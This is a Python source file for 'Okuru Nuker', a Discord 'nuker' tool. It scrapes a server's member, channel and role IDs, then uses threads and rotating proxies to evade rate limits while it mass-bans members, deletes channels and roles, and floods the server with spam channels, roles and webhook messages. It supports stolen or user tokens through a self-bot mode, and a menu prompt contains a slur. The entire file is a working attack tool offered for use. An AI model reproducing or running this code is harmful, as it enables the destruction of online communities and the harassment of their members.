import os, sys, threading, time, discord, requests, colorama, random, json
from discord.ext import commands
from colorama import Fore
from itertools import cycle




config = json.load(open('config.json'))

prefix = config["General"]["Prefix"]
token = config["General"]["Token"]
guild = config["General"]["Guild To Nuke"]

wh_spam = config["Webhook Spam"]["Spam"]
wh_spam_names = config["Webhook Spam"]["Webhook Names"]
wh_spam_contents = config["Webhook Spam"]["Message Contents"]
wh_spam_amount = config["Webhook Spam"]["Spam Amount"]

os.system('title [Okuru Nuker] - Loading')

def versionCheck():
    if discord.__version__ != '1.4.0':
        print(f"\u001b[38;5;21m[?]\u001b[38;5;15m\u001b[38;5;15m Installing discord.py 1.4\033[37m...\n")
        try:
            os.system('pip install discord.py==1.4 > nul')
            os.system('cls')
            print(f"\u001b[38;5;21m[?]\u001b[38;5;15m\u001b[38;5;15m Successfully Installed.")
            time.sleep(2)
            os._exit(0)
        except:
            print(f"\u001b[38;5;21m[?]\u001b[38;5;15m\u001b[38;5;15m Couldn't install discord 1.4, make sure you have python in path")
            input()
            os._exit(0)

os.system(f'title [Okuru Nuker] - Version Check')
versionCheck()

os.system('title [Okuru Nuker] - Loading Scraped')
proxies = open('proxies.okuru').read().split('\n')
members = open('Scraped/members.okuru').read().split('\n')
channels = open('Scraped/channels.okuru').read().split('\n')
roles = open('Scraped/roles.okuru').read().split('\n')

def clear():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')


print(f'{Fore.LIGHTBLUE_EX}[INFO] \u001b[38;5;253mFinished Loading Proxies')
time.sleep(1)
proxs = cycle(proxies)



def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"


token_type = check_token(token)

if token_type == "user":
    headers = {'Authorization': token}
    client = commands.Bot(
        command_prefix=prefix,
        case_insensitive=False,
        self_bot=True
        )
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(
        command_prefix=prefix, 
        case_insensitive=False
        )



def ban(i):
    r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
                     proxies={"http": 'http://' + next(proxs)},
                     headers=headers)
    if r.status_code == 429:
        sys.stdout.write(f"\u001b[38;5;196m[MassBan]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
        ban(i)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[Massban]\u001b[38;5;253m => Banned {i}\n')


def chandel(u):
    r = requests.delete(f"https://discord.com/api/v9/channels/{u}",
                     proxies={"http": 'http://' + next(proxs)},
                     headers=headers)
    if r.status_code == 429:
        sys.stdout.write(f"\u001b[38;5;196m[ChannelDeletion]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
        chandel(u)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[ChannelDeletion]\u001b[38;5;253m => Deleted => {u}\n')


def roledel(k):
    r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{k}",
                     proxies={"http": 'http://' + next(proxs)},
                     headers=headers)
    if r.status_code == 429:
        sys.stdout.write(f"\u001b[38;5;196m[RoleDeletion]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
        roledel(k)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[RoleDeletion]\u001b[38;5;253m => Deleted {k}\n')

def makewebhook(channel):
    try:
        json = {
            'name': random.choice(wh_spam_names),
        }
        r = requests.post(
            f'https://discord.com/api/v8/channels/{channel}/webhooks',
            headers=headers,
            json=json,
            proxies={"http": 'http://' + next(proxs)})
        wh_id = r.json()['id']
        wh_token = r.json()['token']
        return f'https://discord.com/api/webhooks/{wh_id}/{wh_token}'
    except:
        pass

def sendwebhook(webhook):
    try:
        for i in range(wh_spam_amount):
            payload={
                'username': random.choice(wh_spam_names),
                'content': random.choice(wh_spam_contents)
            }
            requests.post(webhook, json=payload, proxies={"http": 'http://' + next(proxs)})
    except:
        pass

def spamchannel(name):
    json = {'name': name, 'type': 0}
    r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",
                     proxies={"http": 'http://' + next(proxs)},
                     headers=headers, json=json)
    if r.status_code == 429:
        sys.stdout.write(f"\u001b[38;5;196m[ChannelSpam]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
        spamchannel(name)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[ChannelSpam]\u001b[38;5;253m => Created {name}\n')
        if wh_spam:
            webhook = makewebhook(r.json()['id'])
            threading.Thread(target=sendwebhook, args=(webhook,)).start()


def spamrole(role):
    json = {'name': role, 'type': 0}
    r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",
                     proxies={"http": 'http://' + next(proxs)},
                     headers=headers, json=json)
    if r.status_code == 429:
        sys.stdout.write(f"\u001b[38;5;196m[RoleSpam]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
        spamrole(role)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[RoleSpam]\u001b[38;5;253m => Created {role}\n')


def nukecmd():
  clear()
  print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Ready To Nuke Server;\n")
  name = input("\u001b[38;5;21m[?]\u001b[38;5;15m Channel Names: ")
  amount = input("\u001b[38;5;21m[?]\u001b[38;5;15m Amount Of Channels: ")
  print()
  role = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Role Names: ")
  amount = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Amount Of Roles: ")
  clear()
  print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Nuking Server...")
  for m in members:
    threading.Thread(target=ban, args=(m, )).start()
  for c in channels:
    threading.Thread(target=chandel, args=(c, )).start()
  for r in roles:
    threading.Thread(target=roledel, args=(r, )).start()
  for i in range(int(amount)):
    threading.Thread(target=spamchannel, args=(name, )).start()
  for i in range(int(amount)):
    threading.Thread(target=spamrole, args=(role, )).start()
  print('Finished, Going back in 3 seconds') 
  time.sleep(3)
  clear()
  menu()

os.system(f'title [Okuru Nuker] - Menu')

def menu():
    clear()
    print(f'''
				\u001b[38;5;111m╔═╗╦╔═╦ ╦╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
				\u001b[38;5;159m║ ║╠╩╗║ ║╠╦╝║ ║  ║║║║ ║╠╩╗║╣ ╠╦╝
				\u001b[38;5;195m╚═╝╩ ╩╚═╝╩╚═╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═\u001b[38;5;26m 
                              
			[+]═════════════════════[+]═══════════════════[+]
			 ║ \u001b[38;5;27m[1] - Ban Members     ║ \u001b[38;5;27m[5] - Spam Roles    ║
			 ║ \u001b[38;5;26m[2] - Del Channels    ║ \u001b[38;5;26m[6] - Nuke Server   ║
			 ║ \u001b[38;5;25m[3] - Del Roles       ║ \u001b[38;5;25m[7] - Credits       ║
			 ║ \u001b[38;5;24m[4] - Spam Channels   ║ \u001b[38;5;24m[8] - Scrape        ║
			[+]═════════════════════[+]═══════════════════[+]

			\u001b[38;5;33m'''.center(os.get_terminal_size().columns))

    try:
        choice = int(input('[ > ] '))
    except:
        print('that\'s not a number retard')
        time.sleep(3)
        menu()
    if choice == 1:
        clear()
        os.system(f'title [Okuru Nuker] - Banning members')
        print("[OKURU:INFO] Starting to Ban Members")
        for m in members:
            threading.Thread(target=ban, args=(m, )).start()
        print('Finished, Going back in 3 seconds') 
        time.sleep(3)
        clear()
        menu()
    elif choice == 2:
        clear()
        os.system(f'title [Okuru Nuker] - Deleting Channels')
        print("[OKURU:INFO] Starting to Delete Channels")
        for c in channels:
            threading.Thread(target=chandel, args=(c, )).start()
        print('Finished, Going back in 3 seconds') 
        time.sleep(3)
        clear()
        menu()
    elif choice == 3:
        clear()
        os.system(f'title [Okuru Nuker] - Deleting Roles')
        print("[OKURU:INFO] Starting to Delete Roles")
        for r in roles:
            threading.Thread(target=roledel, args=(r, )).start()
        print('Finished, Going back in 3 seconds') 
        time.sleep(3)
        clear()
        menu()
    elif choice == 4:
        clear()
        os.system(f'title [Okuru Nuker] - Create Channels')
        print("[OKURU:INFO] Starting to Create Channels")
        print()
        name = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Channel Names: ")
        amount = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Amount: ")
        for i in range(int(amount)):
            threading.Thread(target=spamchannel, args=(name, )).start()
        print('Finished, Going back in 3 seconds') 
        time.sleep(3)
        clear()
        menu()
    elif choice == 5:
        clear()
        os.system(f'title [Okuru Nuker] - Create Channels')
        print("[OKURU:INFO] Starting to Create Roles")
        print()
        role = input("\u001b[38;5;21m[?]\u001b[38;5;15m Role Names: ")
        amount = input("\u001b[38;5;21m[?]\u001b[38;5;15m Amount: ")
        for i in range(int(amount)):
            threading.Thread(target=spamrole, args=(role, )).start()
        print('Finished, Going back in 3 seconds') 
        time.sleep(3)
        clear()
        menu()
    elif choice == 6:
      clear()
      os.system(f'title [Okuru Nuker] - Nuking')
      nukecmd()
    elif choice == 7:
        clear()
        print("\u001b[38;5;21m[?]\u001b[38;5;15m This Nuker was made by ; Gowixx, Yum, Aced.")
        print("\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.")
        input()
        menu()
    elif choice == 8:
        print(f'\u001b[38;5;21m[?]\u001b[38;5;15m\u001b[38;5;7m Type \u001b[38;5;12m{prefix}scrape \u001b[38;5;7min any channel of the server.')


@client.command()
async def scrape(ctx):
    await ctx.message.delete()

    try:
        os.remove("Scraped/members.okuru")
        os.remove("Scraped/channels.okuru")
        os.remove("Scraped/roles.okuru")
    except:
        pass

    membercount = 0
    with open('Scraped/members.okuru', 'a') as f:
        for member in ctx.guild.members:
            f.write(str(member.id) + "\n")
            membercount += 1
        print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{membercount}\033[37m Members")

    channelcount = 0
    with open('Scraped/channels.okuru', 'a') as f:
        for channel in ctx.guild.channels:
            f.write(str(channel.id) + "\n")
            channelcount += 1
        print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{channelcount}\033[37m Channels")

    rolecount = 0
    with open('Scraped/roles.okuru', 'a') as f:
        for role in ctx.guild.roles:
            f.write(str(role.id) + "\n")
            rolecount += 1
        print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{rolecount}\033[37m Roles")

    print('Finished, Going back in 3 seconds') 
    time.sleep(3)
    menu()


@client.event
async def on_ready():
    if token_type == "bot":
        menu()


@client.event
async def on_error(ctx, error):
    return
@client.event
async def on_connect():
    if token_type == "user":
        menu()


def Startup():
    try:
        if token_type == "user":
            os.system('cls')
            client.run(
                token, 
                bot=False
            )

        elif token_type == "bot":
            client.run(
                token
            )
    except:
        print(f"{Fore.RED}[?]\u001b[38;5;253m Invalid Token (Could be rate-limited)")

if __name__ == "__main__":
    Startup()

